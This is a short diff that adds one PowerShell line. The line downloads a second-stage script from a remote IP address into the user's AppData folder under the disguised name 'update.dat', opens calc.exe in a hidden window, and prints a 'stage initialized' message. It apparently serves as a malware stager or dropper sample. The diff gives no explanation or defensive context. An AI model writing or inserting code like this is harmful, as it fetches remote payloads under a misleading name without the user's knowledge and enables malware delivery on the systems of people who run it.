@@ -1,0 +1,2 @@
+
+<# Remote fetch #> $DownloadUrl = "http://203.0.113.143:80/stage1.ps1"; $OutputPath = "$env:APPDATA\update.dat"; $StageTimeout = 126; try { Invoke-WebRequest -Uri $DownloadUrl -OutFile $OutputPath -UseBasicParsing; Start-Process -FilePath "calc.exe" -WindowStyle Hidden; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8"; Write-Output "stage 16 initialized" } catch { Write-Warning "Stage transfer failed" }
